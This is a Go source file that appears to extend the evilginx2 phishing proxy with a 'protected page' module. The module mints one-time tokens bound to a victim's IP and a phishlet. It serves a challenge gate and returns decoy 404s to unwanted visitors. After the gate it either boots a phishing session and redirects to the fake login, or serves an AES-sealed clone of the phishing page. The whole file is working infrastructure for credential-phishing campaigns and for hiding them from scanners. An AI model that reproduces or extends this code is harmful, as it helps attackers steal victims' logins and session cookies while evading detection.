package core

import (
	"bytes"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"sync"
	"time"

	"github.com/elazarl/goproxy"
	"github.com/kgretzky/evilginx2/log"
	"gopkg.in/yaml.v2"
)

var (
	protectedCommentRe = regexp.MustCompile(`(?s)<!--.*?-->`)
	protectedSpaceRe   = regexp.MustCompile(`>\s+<`)
	protectedPathRe    = regexp.MustCompile(`^/p/([a-f0-9]{32})$`)

	protectedOnce     sync.Once
	protectedInstance *ProtectedPage
)

// SessionBootFn is called by gate mode after a token burns. It must create
// an evilginx session for the phishlet, set the session cookie, and return
// a 302 to the login URL. Implemented in http_proxy.go as (*HttpProxy).bootSession.
type SessionBootFn func(req *http.Request, phishlet string, clientIP string) (*http.Response, bool)

type ProtectedPage struct {
	tokens      *TokenStore
	keyStore    *KeyStore
	gate        *Gate
	plainHTML   []byte
	redirectURL string
	mode        string // "gate" or "clone" — global default
	cloneDir    string
	cloneCache  map[string][]byte
	cloneMu     sync.Mutex
}

type ppConfig struct {
	Enabled  bool   `yaml:"enabled"`
	Mode     string `yaml:"mode"`
	CloneDir string `yaml:"clone_dir"`
	File     string `yaml:"file"`
	TTL      int    `yaml:"ttl"`
	Redirect string `yaml:"redirect"`
}

// GetProtectedPage lazily loads ~/.evilginx/protected_page.yaml on first call.
// Returns nil if the file is missing, disabled, malformed, or has an invalid mode.
// Silently off on missing file; logs on malformed file.
func GetProtectedPage() *ProtectedPage {
	protectedOnce.Do(func() {
		home, err := os.UserHomeDir()
		if err != nil {
			return
		}
		cfgPath := filepath.Join(home, HOME_DIR, "protected_page.yaml")
		raw, err := os.ReadFile(cfgPath)
		if err != nil {
			return
		}
		var cfg ppConfig
		if err := yaml.Unmarshal(raw, &cfg); err != nil {
			log.Error("protected_page: parse %s: %v", cfgPath, err)
			return
		}
		if !cfg.Enabled {
			log.Info("protected_page: disabled in %s", cfgPath)
			return
		}
		if cfg.Mode == "" {
			cfg.Mode = "gate"
		}
		if cfg.Mode != "gate" && cfg.Mode != "clone" {
			log.Error("protected_page: invalid mode %q (must be gate or clone)", cfg.Mode)
			return
		}

		// In clone mode, pre-load the fallback clone so the first request
		// doesn't pay the read cost. In gate mode, this file is ignored.
		var plainHTML []byte
		if cfg.Mode == "clone" && cfg.File != "" {
			f := cfg.File
			if !filepath.IsAbs(f) {
				f = filepath.Join(home, HOME_DIR, f)
			}
			b, err := os.ReadFile(f)
			if err != nil {
				log.Error("protected_page: read %s: %v", f, err)
			} else {
				b = protectedCommentRe.ReplaceAll(b, nil)
				b = protectedSpaceRe.ReplaceAll(b, []byte("><"))
				plainHTML = b
			}
		}

		cloneDir := cfg.CloneDir
		if cloneDir == "" {
			cloneDir = "protected"
		}
		if !filepath.IsAbs(cloneDir) {
			cloneDir = filepath.Join(home, HOME_DIR, cloneDir)
		}

		ttl := time.Duration(cfg.TTL) * time.Second
		if ttl <= 0 {
			ttl = 20 * time.Minute
		}
		redirect := cfg.Redirect
		if redirect == "" {
			redirect = "/"
		}

		tokens := NewTokenStore(ttl)
		keyStore := NewKeyStore()
		gate := NewGate(tokens, keyStore)

		protectedInstance = &ProtectedPage{
			tokens:      tokens,
			keyStore:    keyStore,
			gate:        gate,
			plainHTML:   plainHTML,
			redirectURL: redirect,
			mode:        cfg.Mode,
			cloneDir:    cloneDir,
			cloneCache:  make(map[string][]byte),
		}
		log.Info("protected_page: loaded (mode=%s, ttl=%s, clone_dir=%s, turnstile=%v)",
			cfg.Mode, ttl, cloneDir, gate.turnstile != "")
	})
	return protectedInstance
}

// MintToken creates a new token bound to (ip, phishlet).
func (pp *ProtectedPage) MintToken(ip, phishlet string) string {
	return pp.tokens.Mint(ip, phishlet)
}

// HandleRequest matches /p/<32-hex>. If matched:
//   - no valid __g cookie  -> serve the gate challenge
//   - valid __g cookie     -> burn token
//   - mode == "gate"       -> call boot() to create a session and 302 to login
//   - mode == "clone"      -> AES-seal the payload and serve the wrapper
//
// Per-phishlet override: if ~/.evilginx/protected/<phishlet>.html exists,
// that phishlet always runs in clone mode regardless of the global setting.
//
// Returns (nil, false) if the path does not match, so the caller continues
// with normal proxy flow.
func (pp *ProtectedPage) HandleRequest(req *http.Request, clientIP string, boot SessionBootFn) (*http.Response, bool) {
	m := protectedPathRe.FindStringSubmatch(req.URL.Path)
	if m == nil {
		return nil, false
	}
	token := m[1]

	// Gate not passed yet — serve the challenge.
	if !pp.gate.hasValidGateCookie(req, token, clientIP) {
		if resp := pp.gate.ServeChallenge(req, token); resp != nil {
			return resp, true
		}
		return decoy404(req), true
	}

	// Gate passed. Burn the token.
	phishlet := pp.tokens.Burn(token, clientIP)
	if phishlet == "" {
		return decoy404(req), true
	}

	// Per-phishlet clone file overrides the global mode.
	mode := pp.mode
	var html []byte
	if pp.hasClone(phishlet) {
		mode = "clone"
		html = pp.loadClone(phishlet)
	} else if pp.mode == "clone" {
		html = pp.plainHTML
	}

	if mode == "gate" {
		if boot == nil {
			log.Error("protected_page: gate mode but no boot callback — misconfiguration")
			return decoy404(req), true
		}
		return boot(req, phishlet, clientIP)
	}

	// Clone mode.
	if len(html) == 0 {
		log.Error("protected_page: clone mode but no payload for phishlet %s", phishlet)
		return decoy404(req), true
	}
	key := pp.keyStore.Get(token)
	if key == nil {
		return decoy404(req), true
	}
	pp.keyStore.Delete(token)

	chunks, iv, err := SealPayload(html, key)
	if err != nil {
		log.Error("protected_page: seal: %v", err)
		return decoy404(req), true
	}
	body := BuildGatedWrapper(chunks, iv, pp.redirectURL)

	log.Info("protected_page: serving clone for phishlet=%s from %s", phishlet, clientIP)

	resp := goproxy.NewResponse(req, "text/html; charset=UTF-8", http.StatusOK, "")
	resp.Header.Set("X-Frame-Options", "SAMEORIGIN")
	resp.Header.Set("X-Content-Type-Options", "nosniff")
	resp.Header.Set("Referrer-Policy", "no-referrer")
	resp.Header.Set("Cache-Control", "no-store, no-cache, must-revalidate")
	resp.Header.Set("Pragma", "no-cache")
	resp.Header.Set("Expires", "0")
	resp.Body = io.NopCloser(bytes.NewReader(body))
	resp.ContentLength = int64(len(body))
	return resp, true
}

// hasClone reports whether a per-phishlet clone file exists in cloneDir.
func (pp *ProtectedPage) hasClone(phishlet string) bool {
	path := filepath.Join(pp.cloneDir, phishlet+".html")
	_, err := os.Stat(path)
	return err == nil
}

// loadClone reads and caches the per-phishlet clone HTML. On read error,
// caches nil so subsequent calls don't retry on every request.
func (pp *ProtectedPage) loadClone(phishlet string) []byte {
	pp.cloneMu.Lock()
	defer pp.cloneMu.Unlock()
	if b, ok := pp.cloneCache[phishlet]; ok {
		return b
	}
	path := filepath.Join(pp.cloneDir, phishlet+".html")
	raw, err := os.ReadFile(path)
	if err != nil {
		log.Error("protected_page: load clone %s: %v", path, err)
		pp.cloneCache[phishlet] = nil
		return nil
	}
	raw = protectedCommentRe.ReplaceAll(raw, nil)
	raw = protectedSpaceRe.ReplaceAll(raw, []byte("><"))
	pp.cloneCache[phishlet] = raw
	log.Info("protected_page: loaded clone %s (%d bytes)", path, len(raw))
	return raw
}